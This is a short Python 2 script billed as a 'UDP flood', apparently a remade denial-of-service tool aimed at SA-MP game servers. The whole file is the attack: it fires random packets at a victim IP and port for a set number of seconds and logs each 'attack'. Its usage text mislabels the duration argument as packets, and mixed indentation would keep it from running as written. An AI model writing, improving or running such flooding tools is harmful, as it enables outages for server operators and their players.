#script Remake
import time
import socket
import random
import sys

def usage():
	print("UDP FLOOD BY LEXSH1N:SAMP")
        print("Type python2 Flood.py (IP) (PORT) (PAKETS) (NOTE MAX PAKETS : 65500")

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(589)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Pakets Run Logs %s  Attacking To Ip :  %s Port : %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
